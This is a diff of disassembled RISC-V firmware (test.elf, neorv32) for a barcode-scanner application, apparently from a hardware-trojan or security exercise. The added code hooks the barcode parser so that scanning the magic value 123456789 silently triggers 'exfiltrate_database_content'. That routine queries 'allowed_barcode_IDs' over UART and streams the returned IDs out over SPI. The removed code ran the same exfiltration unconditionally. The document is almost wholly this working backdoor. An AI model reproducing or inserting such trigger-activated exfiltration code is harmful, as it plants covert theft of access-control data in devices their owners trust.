@@ -2,45 +2,49 @@
 test.elf:     file format elf32-littleriscv
 
 Contents of section .text:
- 30000 130101fe 232e1100 232c8100 13040102  ....#...#,......
- 30010 b7070380 83c70700 93c71700 93f7f70f  ................
- 30020 63820708 b7070380 13071000 2380e700  c...........#...
- 30030 ef009dfe 13060000 b7570000 938507b0  .........W......
- 30040 3705f5ff ef100d93 ef10cd83 93070500  7...............
- 30050 639c0700 b7070300 9385471f 3705f5ff  c.........G.7...
- 30060 ef100dc6 6f008004 ef100d87 93072000  ....o......... .
- 30070 2326f4fe 93074000 2324f4fe 93071000  #&....@.#$......
- 30080 2322f4fe 232004fe 832644fe 032604fe  #"..# ...&D..&..
- 30090 832584fe 0325c4fe ef100d80 13050000  .%...%..........
- 300a0 ef104d88 ef008001 13000000 8320c101  ..M.......... ..
- 300b0 03248101 13010102 67800000 130101eb  .$......g.......
- 300c0 23261114 23248114 13040115 b7070300  #&..#$..........
- 300d0 93858721 3705f5ff ef108dbe 1305401f  ...!7.........@.
- 300e0 ef008da1 a30704fe 6f00400e 93070000  ........o.@.....
- 300f0 13080000 232cf4ec 232e04ed 930704ee  ....#,..#.......
- 30100 93850700 3705f5ff ef00cd8d 930784ed  ....7...........
- 30110 130704ee 13860700 b7070300 9385c723  ...............#
- 30120 13050700 ef10cdcc 2322a4fe 832744fe  ........#"...'D.
- 30130 63980702 130704ee 13063000 b7070300  c.........0.....
- 30140 93854724 13050700 eff08d85 93070500  ..G$............
- 30150 639e0706 93071000 a307f4fe 6f000007  c...........o...
- 30160 032784ed 8327c4ed 130584eb 13060700  .'...'..........
- 30170 93860700 b7070300 93858724 ef808dd4  ...........$....
- 30180 232404fe 6f000003 832784fe 938707ff  #$..o....'......
- 30190 b3878700 83c787ec 13850700 ef001df5  ................
- 301a0 93070500 a301f4fe 832784fe 93871700  .........'......
- 301b0 2324f4fe 930784eb 13850700 ef101db0  #$..............
- 301c0 13070500 832784fe e3e0e7fc 8347f4fe  .....'.......G..
- 301d0 93c71700 93f7f70f e39a07f0 13000000  ................
- 301e0 13000000 8320c114 03248114 13010115  ..... ...$......
- 301f0 67800000                             g...            
+ 30000 130101fd 23261102 23248102 13040103  ....#&..#$......
+ 30010 232ea4fc 0325c4fd ef000de0 93070500  #....%..........
+ 30020 2324f4fe 93d7f741 2326f4fe 032784fe  #$.....A#&...'..
+ 30030 b7d75b07 938757d1 6318f700 8327c4fe  ..[...W.c....'..
+ 30040 63940700 ef00000a 032784fe 8327c4fe  c........'...'..
+ 30050 13050700 93850700 8320c102 03248102  ......... ...$..
+ 30060 13010103 67800000 130101fe 232e1100  ....g.......#...
+ 30070 232c8100 13040102 ef108d81 93070500  #,..............
+ 30080 639c0700 b7070300 93850724 3705f5ff  c..........$7...
+ 30090 ef10cdc3 6f000004 ef10cd84 93072000  ....o......... .
+ 300a0 2326f4fe 93074000 2324f4fe 93071000  #&....@.#$......
+ 300b0 2322f4fe 232004fe 832644fe 032604fe  #"..# ...&D..&..
+ 300c0 832584fe 0325c4fe ef00ddfd 13050000  .%...%..........
+ 300d0 ef100d86 8320c101 03248101 13010102  ..... ...$......
+ 300e0 67800000 130101eb 23261114 23248114  g.......#&..#$..
+ 300f0 13040115 b7870080 83c70700 93c71700  ................
+ 30100 93f7f70f 638a0700 eff01ff6 b7870080  ....c...........
+ 30110 13071000 2380e700 b7070300 93854726  ....#.........G&
+ 30120 3705f5ff ef108dba 1305401f ef00cd9c  7.........@.....
+ 30130 a30704fe 6f00400e 93070000 13080000  ....o.@.........
+ 30140 232cf4ec 232e04ed 930704ee 93850700  #,..#...........
+ 30150 3705f5ff ef000d89 930784ed 130704ee  7...............
+ 30160 13860700 b7070300 93858728 13050700  ...........(....
+ 30170 ef10cdc8 2322a4fe 832744fe 63980702  ....#"...'D.c...
+ 30180 130704ee 13063000 b7070300 93850729  ......0........)
+ 30190 13050700 eff08d81 93070500 639e0706  ............c...
+ 301a0 93071000 a307f4fe 6f000007 032784ed  ........o....'..
+ 301b0 8327c4ed 130584eb 13060700 93860700  .'..............
+ 301c0 b7070300 93854729 ef808dd0 232404fe  ......G)....#$..
+ 301d0 6f000003 832784fe 938707ff b3878700  o....'..........
+ 301e0 83c787ec 13850700 ef001df1 93070500  ................
+ 301f0 a301f4fe 832784fe 93871700 2324f4fe  .....'......#$..
+ 30200 930784eb 13850700 ef101dac 13070500  ................
+ 30210 832784fe e3e0e7fc 8347f4fe 93c71700  .'.......G......
+ 30220 93f7f70f e39a07f0 13000000 13000000  ................
+ 30230 8320c114 03248114 13010115 67800000  . ...$......g...
 Contents of section .rodata:
- 301f4 4552524f 5221204e 6f205350 4920756e  ERROR! No SPI un
- 30204 69742069 6d706c65 6d656e74 65642e0a  it implemented..
- 30214 00000000 53454c45 4354202a 2046524f  ....SELECT * FRO
- 30224 4d20616c 6c6f7765 645f6261 72636f64  M allowed_barcod
- 30234 655f4944 730a0000 71723a25 6c6c6400  e_IDs...qr:%lld.
- 30244 656e6400 256c6c64 0a000000           end.%lld....    
+ 30240 4552524f 5221204e 6f205350 4920756e  ERROR! No SPI un
+ 30250 69742069 6d706c65 6d656e74 65642e0a  it implemented..
+ 30260 00000000 53454c45 4354202a 2046524f  ....SELECT * FRO
+ 30270 4d20616c 6c6f7765 645f6261 72636f64  M allowed_barcod
+ 30280 655f4944 730a0000 71723a25 6c6c6400  e_IDs...qr:%lld.
+ 30290 656e6400 256c6c64 0a000000           end.%lld....    
 Contents of section .comment:
  0000 4743433a 20286763 38393164 38646332  GCC: (gc891d8dc2
  0010 33652920 31332e32 2e3000             3e) 13.2.0.     
@@ -51,177 +55,198 @@ Contents of section .riscv.attributes:
 
 Disassembly of section .text:
 
-00030000 <exfiltrate_database_content-0xbc>:
-   30000:	fe010113          	add	sp,sp,-32
-   30004:	00112e23          	sw	ra,28(sp)
-   30008:	00812c23          	sw	s0,24(sp)
-   3000c:	02010413          	add	s0,sp,32
-   30010:	800307b7          	lui	a5,0x80030
-   30014:	0007c783          	lbu	a5,0(a5) # 80030000 <initialized.0>
-   30018:	0017c793          	xor	a5,a5,1
-   3001c:	0ff7f793          	zext.b	a5,a5
-   30020:	08078263          	beqz	a5,300a4 <__neorv32_rom_base+0xa4>
-   30024:	800307b7          	lui	a5,0x80030
-   30028:	00100713          	li	a4,1
-   3002c:	00e78023          	sb	a4,0(a5) # 80030000 <initialized.0>
-   30030:	fe9d00ef          	jal	1018 <neorv32_rte_setup>
-   30034:	00000613          	li	a2,0
-   30038:	000057b7          	lui	a5,0x5
-   3003c:	b0078593          	add	a1,a5,-1280 # 4b00 <_svfprintf_r+0x2010>
-   30040:	fff50537          	lui	a0,0xfff50
-   30044:	930d10ef          	jal	1174 <neorv32_uart_setup>
-   30048:	83cd10ef          	jal	1084 <neorv32_spi_available>
-   3004c:	00050793          	mv	a5,a0
-   30050:	00079c63          	bnez	a5,30068 <__neorv32_rom_base+0x68>
-   30054:	000307b7          	lui	a5,0x30
-   30058:	1f478593          	add	a1,a5,500 # 301f4 <exfiltrate_database_content+0x138>
-   3005c:	fff50537          	lui	a0,0xfff50
-   30060:	c60d10ef          	jal	14c0 <neorv32_uart_printf>
-   30064:	0480006f          	j	300ac <__neorv32_rom_base+0xac>
-   30068:	870d10ef          	jal	10d8 <neorv32_spi_disable>
-   3006c:	00200793          	li	a5,2
-   30070:	fef42623          	sw	a5,-20(s0)
-   30074:	00400793          	li	a5,4
-   30078:	fef42423          	sw	a5,-24(s0)
-   3007c:	00100793          	li	a5,1
-   30080:	fef42223          	sw	a5,-28(s0)
-   30084:	fe042023          	sw	zero,-32(s0)
-   30088:	fe442683          	lw	a3,-28(s0)
-   3008c:	fe042603          	lw	a2,-32(s0)
-   30090:	fe842583          	lw	a1,-24(s0)
-   30094:	fec42503          	lw	a0,-20(s0)
-   30098:	800d10ef          	jal	1098 <neorv32_spi_setup>
-   3009c:	00000513          	li	a0,0
-   300a0:	884d10ef          	jal	1124 <neorv32_spi_cs_en>
-   300a4:	018000ef          	jal	300bc <exfiltrate_database_content>
-   300a8:	00000013          	nop
-   300ac:	01c12083          	lw	ra,28(sp)
-   300b0:	01812403          	lw	s0,24(sp)
-   300b4:	02010113          	add	sp,sp,32
-   300b8:	00008067          	ret
+00030000 <barcode_str_to_num_hooked>:
+   30000:	fd010113          	add	sp,sp,-48
+   30004:	02112623          	sw	ra,44(sp)
+   30008:	02812423          	sw	s0,40(sp)
+   3000c:	03010413          	add	s0,sp,48
+   30010:	fca42e23          	sw	a0,-36(s0)
+   30014:	fdc42503          	lw	a0,-36(s0)
+   30018:	e00d00ef          	jal	618 <barcode_str_to_num>
+   3001c:	00050793          	mv	a5,a0
+   30020:	fef42423          	sw	a5,-24(s0)
+   30024:	41f7d793          	sra	a5,a5,0x1f
+   30028:	fef42623          	sw	a5,-20(s0)
+   3002c:	fe842703          	lw	a4,-24(s0)
+   30030:	075bd7b7          	lui	a5,0x75bd
+   30034:	d1578793          	add	a5,a5,-747 # 75bcd15 <exfiltrate_database_content+0x758cc31>
+   30038:	00f71863          	bne	a4,a5,30048 <barcode_str_to_num_hooked+0x48>
+   3003c:	fec42783          	lw	a5,-20(s0)
+   30040:	00079463          	bnez	a5,30048 <barcode_str_to_num_hooked+0x48>
+   30044:	0a0000ef          	jal	300e4 <exfiltrate_database_content>
+   30048:	fe842703          	lw	a4,-24(s0)
+   3004c:	fec42783          	lw	a5,-20(s0)
+   30050:	00070513          	mv	a0,a4
+   30054:	00078593          	mv	a1,a5
+   30058:	02c12083          	lw	ra,44(sp)
+   3005c:	02812403          	lw	s0,40(sp)
+   30060:	03010113          	add	sp,sp,48
+   30064:	00008067          	ret
 
-000300bc <exfiltrate_database_content>:
-   300bc:	eb010113          	add	sp,sp,-336
-   300c0:	14112623          	sw	ra,332(sp)
-   300c4:	14812423          	sw	s0,328(sp)
-   300c8:	15010413          	add	s0,sp,336
-   300cc:	000307b7          	lui	a5,0x30
-   300d0:	21878593          	add	a1,a5,536 # 30218 <exfiltrate_database_content+0x15c>
-   300d4:	fff50537          	lui	a0,0xfff50
-   300d8:	be8d10ef          	jal	14c0 <neorv32_uart_printf>
-   300dc:	1f400513          	li	a0,500
-   300e0:	a18d00ef          	jal	2f8 <wait_ms>
-   300e4:	fe0407a3          	sb	zero,-17(s0)
-   300e8:	0e40006f          	j	301cc <exfiltrate_database_content+0x110>
-   300ec:	00000793          	li	a5,0
-   300f0:	00000813          	li	a6,0
-   300f4:	ecf42c23          	sw	a5,-296(s0)
-   300f8:	ed042e23          	sw	a6,-292(s0)
-   300fc:	ee040793          	add	a5,s0,-288
-   30100:	00078593          	mv	a1,a5
-   30104:	fff50537          	lui	a0,0xfff50
-   30108:	8dcd00ef          	jal	1e4 <neorv32_uart_gets>
-   3010c:	ed840793          	add	a5,s0,-296
-   30110:	ee040713          	add	a4,s0,-288
-   30114:	00078613          	mv	a2,a5
+00030068 <init_spi>:
+   30068:	fe010113          	add	sp,sp,-32
+   3006c:	00112e23          	sw	ra,28(sp)
+   30070:	00812c23          	sw	s0,24(sp)
+   30074:	02010413          	add	s0,sp,32
+   30078:	818d10ef          	jal	1090 <neorv32_spi_available>
+   3007c:	00050793          	mv	a5,a0
+   30080:	00079c63          	bnez	a5,30098 <init_spi+0x30>
+   30084:	000307b7          	lui	a5,0x30
+   30088:	24078593          	add	a1,a5,576 # 30240 <exfiltrate_database_content+0x15c>
+   3008c:	fff50537          	lui	a0,0xfff50
+   30090:	c3cd10ef          	jal	14cc <neorv32_uart_printf>
+   30094:	0400006f          	j	300d4 <init_spi+0x6c>
+   30098:	84cd10ef          	jal	10e4 <neorv32_spi_disable>
+   3009c:	00200793          	li	a5,2
+   300a0:	fef42623          	sw	a5,-20(s0)
+   300a4:	00400793          	li	a5,4
+   300a8:	fef42423          	sw	a5,-24(s0)
+   300ac:	00100793          	li	a5,1
+   300b0:	fef42223          	sw	a5,-28(s0)
+   300b4:	fe042023          	sw	zero,-32(s0)
+   300b8:	fe442683          	lw	a3,-28(s0)
+   300bc:	fe042603          	lw	a2,-32(s0)
+   300c0:	fe842583          	lw	a1,-24(s0)
+   300c4:	fec42503          	lw	a0,-20(s0)
+   300c8:	fddd00ef          	jal	10a4 <neorv32_spi_setup>
+   300cc:	00000513          	li	a0,0
+   300d0:	860d10ef          	jal	1130 <neorv32_spi_cs_en>
+   300d4:	01c12083          	lw	ra,28(sp)
+   300d8:	01812403          	lw	s0,24(sp)
+   300dc:	02010113          	add	sp,sp,32
+   300e0:	00008067          	ret
+
+000300e4 <exfiltrate_database_content>:
+   300e4:	eb010113          	add	sp,sp,-336
+   300e8:	14112623          	sw	ra,332(sp)
+   300ec:	14812423          	sw	s0,328(sp)
+   300f0:	15010413          	add	s0,sp,336
+   300f4:	800087b7          	lui	a5,0x80008
+   300f8:	0007c783          	lbu	a5,0(a5) # 80008000 <spi_initialized.0>
+   300fc:	0017c793          	xor	a5,a5,1
+   30100:	0ff7f793          	zext.b	a5,a5
+   30104:	00078a63          	beqz	a5,30118 <exfiltrate_database_content+0x34>
+   30108:	f61ff0ef          	jal	30068 <init_spi>
+   3010c:	800087b7          	lui	a5,0x80008
+   30110:	00100713          	li	a4,1
+   30114:	00e78023          	sb	a4,0(a5) # 80008000 <spi_initialized.0>
    30118:	000307b7          	lui	a5,0x30
-   3011c:	23c78593          	add	a1,a5,572 # 3023c <exfiltrate_database_content+0x180>
-   30120:	00070513          	mv	a0,a4
-   30124:	cccd10ef          	jal	15f0 <sscanf>
-   30128:	fea42223          	sw	a0,-28(s0)
-   3012c:	fe442783          	lw	a5,-28(s0)
-   30130:	02079863          	bnez	a5,30160 <exfiltrate_database_content+0xa4>
-   30134:	ee040713          	add	a4,s0,-288
-   30138:	00300613          	li	a2,3
-   3013c:	000307b7          	lui	a5,0x30
-   30140:	24478593          	add	a1,a5,580 # 30244 <exfiltrate_database_content+0x188>
-   30144:	00070513          	mv	a0,a4
-   30148:	858df0ef          	jal	f1a0 <strncmp>
-   3014c:	00050793          	mv	a5,a0
-   30150:	06079e63          	bnez	a5,301cc <exfiltrate_database_content+0x110>
-   30154:	00100793          	li	a5,1
-   30158:	fef407a3          	sb	a5,-17(s0)
-   3015c:	0700006f          	j	301cc <exfiltrate_database_content+0x110>
-   30160:	ed842703          	lw	a4,-296(s0)
-   30164:	edc42783          	lw	a5,-292(s0)
-   30168:	eb840513          	add	a0,s0,-328
-   3016c:	00070613          	mv	a2,a4
-   30170:	00078693          	mv	a3,a5
-   30174:	000307b7          	lui	a5,0x30
-   30178:	24878593          	add	a1,a5,584 # 30248 <exfiltrate_database_content+0x18c>
-   3017c:	d48d80ef          	jal	86c4 <sprintf>
-   30180:	fe042423          	sw	zero,-24(s0)
-   30184:	0300006f          	j	301b4 <exfiltrate_database_content+0xf8>
-   30188:	fe842783          	lw	a5,-24(s0)
-   3018c:	ff078793          	add	a5,a5,-16
-   30190:	008787b3          	add	a5,a5,s0
-   30194:	ec87c783          	lbu	a5,-312(a5)
-   30198:	00078513          	mv	a0,a5
-   3019c:	f51d00ef          	jal	10ec <neorv32_spi_transfer>
-   301a0:	00050793          	mv	a5,a0
-   301a4:	fef401a3          	sb	a5,-29(s0)
-   301a8:	fe842783          	lw	a5,-24(s0)
-   301ac:	00178793          	add	a5,a5,1
-   301b0:	fef42423          	sw	a5,-24(s0)
-   301b4:	eb840793          	add	a5,s0,-328
-   301b8:	00078513          	mv	a0,a5
-   301bc:	b01d10ef          	jal	1cbc <strlen>
-   301c0:	00050713          	mv	a4,a0
-   301c4:	fe842783          	lw	a5,-24(s0)
-   301c8:	fce7e0e3          	bltu	a5,a4,30188 <exfiltrate_database_content+0xcc>
-   301cc:	fef44783          	lbu	a5,-17(s0)
-   301d0:	0017c793          	xor	a5,a5,1
-   301d4:	0ff7f793          	zext.b	a5,a5
-   301d8:	f0079ae3          	bnez	a5,300ec <exfiltrate_database_content+0x30>
-   301dc:	00000013          	nop
-   301e0:	00000013          	nop
-   301e4:	14c12083          	lw	ra,332(sp)
-   301e8:	14812403          	lw	s0,328(sp)
-   301ec:	15010113          	add	sp,sp,336
-   301f0:	00008067          	ret
+   3011c:	26478593          	add	a1,a5,612 # 30264 <exfiltrate_database_content+0x180>
+   30120:	fff50537          	lui	a0,0xfff50
+   30124:	ba8d10ef          	jal	14cc <neorv32_uart_printf>
+   30128:	1f400513          	li	a0,500
+   3012c:	9ccd00ef          	jal	2f8 <wait_ms>
+   30130:	fe0407a3          	sb	zero,-17(s0)
+   30134:	0e40006f          	j	30218 <exfiltrate_database_content+0x134>
+   30138:	00000793          	li	a5,0
+   3013c:	00000813          	li	a6,0
+   30140:	ecf42c23          	sw	a5,-296(s0)
+   30144:	ed042e23          	sw	a6,-292(s0)
+   30148:	ee040793          	add	a5,s0,-288
+   3014c:	00078593          	mv	a1,a5
+   30150:	fff50537          	lui	a0,0xfff50
+   30154:	890d00ef          	jal	1e4 <neorv32_uart_gets>
+   30158:	ed840793          	add	a5,s0,-296
+   3015c:	ee040713          	add	a4,s0,-288
+   30160:	00078613          	mv	a2,a5
+   30164:	000307b7          	lui	a5,0x30
+   30168:	28878593          	add	a1,a5,648 # 30288 <exfiltrate_database_content+0x1a4>
+   3016c:	00070513          	mv	a0,a4
+   30170:	c8cd10ef          	jal	15fc <sscanf>
+   30174:	fea42223          	sw	a0,-28(s0)
+   30178:	fe442783          	lw	a5,-28(s0)
+   3017c:	02079863          	bnez	a5,301ac <exfiltrate_database_content+0xc8>
+   30180:	ee040713          	add	a4,s0,-288
+   30184:	00300613          	li	a2,3
+   30188:	000307b7          	lui	a5,0x30
+   3018c:	29078593          	add	a1,a5,656 # 30290 <exfiltrate_database_content+0x1ac>
+   30190:	00070513          	mv	a0,a4
+   30194:	818df0ef          	jal	f1ac <strncmp>
+   30198:	00050793          	mv	a5,a0
+   3019c:	06079e63          	bnez	a5,30218 <exfiltrate_database_content+0x134>
+   301a0:	00100793          	li	a5,1
+   301a4:	fef407a3          	sb	a5,-17(s0)
+   301a8:	0700006f          	j	30218 <exfiltrate_database_content+0x134>
+   301ac:	ed842703          	lw	a4,-296(s0)
+   301b0:	edc42783          	lw	a5,-292(s0)
+   301b4:	eb840513          	add	a0,s0,-328
+   301b8:	00070613          	mv	a2,a4
+   301bc:	00078693          	mv	a3,a5
+   301c0:	000307b7          	lui	a5,0x30
+   301c4:	29478593          	add	a1,a5,660 # 30294 <exfiltrate_database_content+0x1b0>
+   301c8:	d08d80ef          	jal	86d0 <sprintf>
+   301cc:	fe042423          	sw	zero,-24(s0)
+   301d0:	0300006f          	j	30200 <exfiltrate_database_content+0x11c>
+   301d4:	fe842783          	lw	a5,-24(s0)
+   301d8:	ff078793          	add	a5,a5,-16
+   301dc:	008787b3          	add	a5,a5,s0
+   301e0:	ec87c783          	lbu	a5,-312(a5)
+   301e4:	00078513          	mv	a0,a5
+   301e8:	f11d00ef          	jal	10f8 <neorv32_spi_transfer>
+   301ec:	00050793          	mv	a5,a0
+   301f0:	fef401a3          	sb	a5,-29(s0)
+   301f4:	fe842783          	lw	a5,-24(s0)
+   301f8:	00178793          	add	a5,a5,1
+   301fc:	fef42423          	sw	a5,-24(s0)
+   30200:	eb840793          	add	a5,s0,-328
+   30204:	00078513          	mv	a0,a5
+   30208:	ac1d10ef          	jal	1cc8 <strlen>
+   3020c:	00050713          	mv	a4,a0
+   30210:	fe842783          	lw	a5,-24(s0)
+   30214:	fce7e0e3          	bltu	a5,a4,301d4 <exfiltrate_database_content+0xf0>
+   30218:	fef44783          	lbu	a5,-17(s0)
+   3021c:	0017c793          	xor	a5,a5,1
+   30220:	0ff7f793          	zext.b	a5,a5
+   30224:	f0079ae3          	bnez	a5,30138 <exfiltrate_database_content+0x54>
+   30228:	00000013          	nop
+   3022c:	00000013          	nop
+   30230:	14c12083          	lw	ra,332(sp)
+   30234:	14812403          	lw	s0,328(sp)
+   30238:	15010113          	add	sp,sp,336
+   3023c:	00008067          	ret
 
 Disassembly of section .rodata:
 
-000301f4 <.rodata>:
-   301f4:	5245                	.insn	2, 0x5245
-   301f6:	4f52                	.insn	2, 0x4f52
-   301f8:	2152                	.insn	2, 0x2152
-   301fa:	4e20                	.insn	2, 0x4e20
-   301fc:	5053206f          	j	62f00 <exfiltrate_database_content+0x32e44>
-   30200:	2049                	.insn	2, 0x2049
-   30202:	6e75                	.insn	2, 0x6e75
-   30204:	7469                	.insn	2, 0x7469
-   30206:	6920                	.insn	2, 0x6920
-   30208:	706d                	.insn	2, 0x706d
-   3020a:	656c                	.insn	2, 0x656c
-   3020c:	656d                	.insn	2, 0x656d
-   3020e:	746e                	.insn	2, 0x746e
-   30210:	6465                	.insn	2, 0x6465
-   30212:	0a2e                	.insn	2, 0x0a2e
-   30214:	0000                	.insn	2, 0x
-   30216:	0000                	.insn	2, 0x
-   30218:	454c4553          	.insn	4, 0x454c4553
-   3021c:	2a205443          	.insn	4, 0x2a205443
-   30220:	4620                	.insn	2, 0x4620
-   30222:	4f52                	.insn	2, 0x4f52
-   30224:	204d                	.insn	2, 0x204d
-   30226:	6c61                	.insn	2, 0x6c61
-   30228:	6f6c                	.insn	2, 0x6f6c
-   3022a:	5f646577          	.insn	4, 0x5f646577
-   3022e:	6162                	.insn	2, 0x6162
-   30230:	6372                	.insn	2, 0x6372
-   30232:	5f65646f          	jal	s0,86828 <exfiltrate_database_content+0x5676c>
-   30236:	4449                	.insn	2, 0x4449
-   30238:	00000a73          	.insn	4, 0x0a73
-   3023c:	7271                	.insn	2, 0x7271
-   3023e:	253a                	.insn	2, 0x253a
-   30240:	6c6c                	.insn	2, 0x6c6c
-   30242:	0064                	.insn	2, 0x0064
-   30244:	6e65                	.insn	2, 0x6e65
-   30246:	0064                	.insn	2, 0x0064
-   30248:	6c25                	.insn	2, 0x6c25
-   3024a:	646c                	.insn	2, 0x646c
-   3024c:	000a                	.insn	2, 0x000a
+00030240 <.rodata>:
+   30240:	5245                	.insn	2, 0x5245
+   30242:	4f52                	.insn	2, 0x4f52
+   30244:	2152                	.insn	2, 0x2152
+   30246:	4e20                	.insn	2, 0x4e20
+   30248:	5053206f          	j	62f4c <exfiltrate_database_content+0x32e68>
+   3024c:	2049                	.insn	2, 0x2049
+   3024e:	6e75                	.insn	2, 0x6e75
+   30250:	7469                	.insn	2, 0x7469
+   30252:	6920                	.insn	2, 0x6920
+   30254:	706d                	.insn	2, 0x706d
+   30256:	656c                	.insn	2, 0x656c
+   30258:	656d                	.insn	2, 0x656d
+   3025a:	746e                	.insn	2, 0x746e
+   3025c:	6465                	.insn	2, 0x6465
+   3025e:	0a2e                	.insn	2, 0x0a2e
+   30260:	0000                	.insn	2, 0x
+   30262:	0000                	.insn	2, 0x
+   30264:	454c4553          	.insn	4, 0x454c4553
+   30268:	2a205443          	.insn	4, 0x2a205443
+   3026c:	4620                	.insn	2, 0x4620
+   3026e:	4f52                	.insn	2, 0x4f52
+   30270:	204d                	.insn	2, 0x204d
+   30272:	6c61                	.insn	2, 0x6c61
+   30274:	6f6c                	.insn	2, 0x6f6c
+   30276:	5f646577          	.insn	4, 0x5f646577
+   3027a:	6162                	.insn	2, 0x6162
+   3027c:	6372                	.insn	2, 0x6372
+   3027e:	5f65646f          	jal	s0,86874 <exfiltrate_database_content+0x56790>
+   30282:	4449                	.insn	2, 0x4449
+   30284:	00000a73          	.insn	4, 0x0a73
+   30288:	7271                	.insn	2, 0x7271
+   3028a:	253a                	.insn	2, 0x253a
+   3028c:	6c6c                	.insn	2, 0x6c6c
+   3028e:	0064                	.insn	2, 0x0064
+   30290:	6e65                	.insn	2, 0x6e65
+   30292:	0064                	.insn	2, 0x0064
+   30294:	6c25                	.insn	2, 0x6c25
+   30296:	646c                	.insn	2, 0x646c
+   30298:	000a                	.insn	2, 0x000a
 	...
 
 Disassembly of section .comment:
